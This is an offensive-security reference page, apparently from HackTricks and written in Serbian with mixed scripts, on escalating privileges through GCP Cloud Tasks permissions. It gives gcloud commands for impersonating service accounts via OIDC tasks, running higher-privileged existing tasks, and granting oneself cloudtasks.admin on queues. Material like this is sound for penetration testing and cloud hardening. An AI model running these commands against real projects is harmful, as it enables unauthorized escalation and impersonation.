# GCP - Cloud Tasks Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Tasks

### `cloudtasks.tasks.create`, `iam.serviceAccounts.actAs`

Napadač sa ovim permisijama može **impersonate other service accounts** kreiranjem Cloud Tasks koji se izvršavaju pod identitetom specificiranog service account-a. Ovo omogućava slanje **autentifikovanih HTTP zahteva ka IAM-zaštićenim Cloud Run ili Cloud Functions servisima**.

<details><summary>Kreiraj Cloud Task sa service account impersonation</summary>
```bash
gcloud tasks create-http-task \
task-$(date '+%Y%m%d%H%M%S') \
--location us-central1 \
--queue <queue_name> \
--url 'https://<service_name>.us-central1.run.app' \
--method POST \
--header 'X-Hello: world' \
--body-content '{"hello":"world"}' \
--oidc-service-account-email <account>@<project_id>.iam.gserviceaccount.com
```
</details>

### `cloudtasks.tasks.run`, `cloudtasks.tasks.list`

Napadač sa ovim dozvolama može **pokretati postojeće zakazane zadatke** bez dozvola na servisnom nalogu povezanom sa zadatkom. Ovo omogućava izvršavanje zadataka koji su prethodno kreirani pomoću servisnih naloga sa većim privilegijama.

<details><summary>Pokretanje postojećeg Cloud Task-a bez actAs dozvole</summary>
```bash
gcloud tasks run projects/<project_id>/locations/us-central1/queues/<queue_name>/tasks/<task_id>
```
</details>

Principал који извршава ову команду **не мора да има `iam.serviceAccounts.actAs` дозволу** на сервисном налогу задатка. Међутим, ово дозвољава само покретање постојећих задатака — не даје могућност креирања или измене задатака.

### `cloudtasks.queues.setIamPolicy`

Нападач који има ову дозволу може да **додели себи или другим принципалима Cloud Tasks улоге** на одређеним редовима, потенцијално ескалирајући до `roles/cloudtasks.admin` која укључује могућност креирања и покретања задатака.

<details><summary>Dodeli Cloud Tasks administratorsku ulogu na redu</summary>
```bash
gcloud tasks queues add-iam-policy-binding \
<queue_name> \
--location us-central1 \
--member serviceAccount:<account>@<project_id>.iam.gserviceaccount.com \
--role roles/cloudtasks.admin
```
</details>

Ovo omogućava napadaču da dodeli pune Cloud Tasks admin permissions na redu bilo kojem service account-u kojim upravlja.

## References

- [Google Cloud Tasks Documentation](https://cloud.google.com/tasks/docs)

{{#include ../../../banners/hacktricks-training.md}}
